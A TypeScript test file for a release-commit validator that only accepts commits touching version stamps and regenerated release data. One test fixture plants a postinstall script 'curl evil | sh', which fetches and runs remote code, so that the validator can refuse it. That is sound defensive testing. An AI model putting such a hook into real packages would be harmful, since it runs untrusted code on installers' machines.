// SPDX-License-Identifier: MPL-2.0
/**
 * release.yml runs the slim gate only for a commit that releaseCommitProblems
 * accepts, so every rule here guards the full test suite: a commit that
 * changes anything besides version stamps and regenerated release data must
 * be refused.
 */
import { describe, expect, it } from "bun:test";
import { releaseCommitProblems, releaseFileProblem } from "./release-commit.ts";

const V = "0.10.66";

const pkg = (version: string, extra: Record<string, unknown> = {}) =>
  `${JSON.stringify({ name: "@caelo-cms/shared", version, ...extra }, null, 2)}\n`;

describe("releaseFileProblem", () => {
  it("accepts a package.json whose only change is its version", () => {
    expect(
      releaseFileProblem(
        { path: "packages/shared/package.json", base: pkg("0.10.65"), head: pkg(V) },
        V,
      ),
    ).toBeNull();
  });

  it("refuses a package.json that also changes a script or a dependency", () => {
    const head = pkg(V, { scripts: { postinstall: "curl evil | sh" } });
    expect(releaseFileProblem({ path: "package.json", base: pkg("0.10.65"), head }, V)).toContain(
      "changes more than its version",
    );
  });

  it("accepts server.json with its nested package versions moved", () => {
    const at = (v: string) => JSON.stringify({ version: v, packages: [{ name: "x", version: v }] });
    expect(
      releaseFileProblem(
        { path: "packages/mcp-server/server.json", base: at("0.10.65"), head: at(V) },
        V,
      ),
    ).toBeNull();
  });

  it("accepts lockfile workspace version lines and refuses any other lockfile line", () => {
    const lock = (v: string, zod: string) =>
      `{\n  "workspaces": {\n    "packages/shared": {\n      "name": "@caelo-cms/shared",\n      "version": "${v}",\n    },\n  },\n  "packages": {\n    "zod": ["zod@${zod}", "", {}, "sha512-x"],\n  },\n}\n`;
    expect(
      releaseFileProblem(
        { path: "bun.lock", base: lock("0.10.65", "4.1.0"), head: lock(V, "4.1.0") },
        V,
      ),
    ).toBeNull();
    expect(
      releaseFileProblem(
        { path: "bun.lock", base: lock("0.10.65", "4.1.0"), head: lock(V, "4.2.0") },
        V,
      ),
    ).toContain("changes more than its version stamp");
  });

  it("accepts version.ts with only CAELO_VERSION moved", () => {
    const src = (v: string, extra = "") => `export const CAELO_VERSION = "${v}";\n${extra}`;
    const path = "packages/shared/src/version.ts";
    expect(releaseFileProblem({ path, base: src("0.10.65"), head: src(V) }, V)).toBeNull();
    expect(
      releaseFileProblem({ path, base: src("0.10.65"), head: src(V, "export const X = 1;\n") }, V),
    ).not.toBeNull();
  });

  it("accepts the README only when its Cloud Shell links are all that moved", () => {
    const readme = (v: string, tail = "") =>
      `Install: https://shell.cloud.google.com/?cloudshell_git_branch=release-v${v}\n${tail}`;
    expect(
      releaseFileProblem({ path: "README.md", base: readme("0.10.65"), head: readme(V) }, V),
    ).toBeNull();
    expect(
      releaseFileProblem(
        { path: "README.md", base: readme("0.10.65"), head: readme(V, "more") },
        V,
      ),
    ).not.toBeNull();
  });

  it("accepts the regenerated release data with any content", () => {
    for (const path of [
      "CHANGELOG.md",
      "release-meta.json",
      "packages/mcp-server/power-catalogue.json",
    ]) {
      expect(releaseFileProblem({ path, base: "a", head: "b" }, V)).toBeNull();
    }
  });

  it("refuses source files and added or deleted files", () => {
    expect(releaseFileProblem({ path: "scripts/release.ts", base: "a", head: "b" }, V)).toContain(
      "not a file the release script writes",
    );
    expect(releaseFileProblem({ path: "CHANGELOG.md", base: null, head: "b" }, V)).toContain(
      "added",
    );
    expect(releaseFileProblem({ path: "package.json", base: "a", head: null }, V)).toContain(
      "deleted",
    );
  });
});

describe("releaseCommitProblems", () => {
  it("refuses an empty commit", () => {
    expect(releaseCommitProblems([], V)).toEqual(["the commit changes nothing"]);
  });

  it("lists every offending file", () => {
    const problems = releaseCommitProblems(
      [
        { path: "CHANGELOG.md", base: "a", head: "b" },
        { path: "apps/admin/src/hooks.server.ts", base: "a", head: "b" },
      ],
      V,
    );
    expect(problems).toEqual([
      "apps/admin/src/hooks.server.ts: not a file the release script writes",
    ]);
  });
});
